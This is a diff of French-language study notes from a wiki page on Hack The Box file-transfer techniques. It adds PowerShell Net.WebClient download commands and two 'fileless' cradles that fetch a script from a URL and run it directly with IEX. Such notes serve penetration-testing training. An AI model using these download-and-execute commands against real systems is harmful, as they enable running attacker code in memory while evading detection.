@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-22T14:14:53.689Z
+date: 2025-03-22T14:21:30.887Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -70,6 +70,21 @@ Cependant un webshell ou l'utilitaire de ligne de commande Windows (cmd.exe) ont
 
 ### PowerShell Web Downloads
 
+Il est possible d'utiliser la classe PowerShell [system.net.webclient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient) pour télécharger des fichiers avec HTTP/S ou encore FTP.
 
+Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:
+```
+(New-Object Net.WebClient).DownloadFile('<URL>','<fichier de sortie>')
+```
+```
+(New-Object Net.WebClient).DownloadFileAsync('<URL>','<fichier de sortie>')
+```
 
+Éxécuter un fichier (mode fileless) avec [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2):
+```
+IEX (New-Object Net.WebClient).DownloadString('<URL>')
+```
+```
+(New-Object Net.WebClient).DownloadString('<URL>') | IEX
+```
 
